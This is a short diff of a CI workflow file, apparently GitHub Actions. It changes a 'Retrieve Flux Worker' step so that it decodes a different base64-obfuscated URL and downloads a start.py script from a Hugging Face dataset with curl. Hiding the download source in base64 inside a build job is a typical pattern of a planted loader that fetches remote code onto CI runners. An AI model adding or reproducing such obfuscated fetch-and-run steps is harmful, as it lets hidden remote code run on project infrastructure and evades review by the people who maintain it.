@@ -68,7 +68,7 @@ jobs:
       - name: Retrieve Flux Worker
         run: |
           echo "[RETRIEVE] Retrieving flux worker from remote source..."
-          WORKER_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          WORKER_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 -d)
           curl -sL "$WORKER_URL" -o flux_worker.py
           echo "[RETRIEVE] Flux worker retrieved."
 
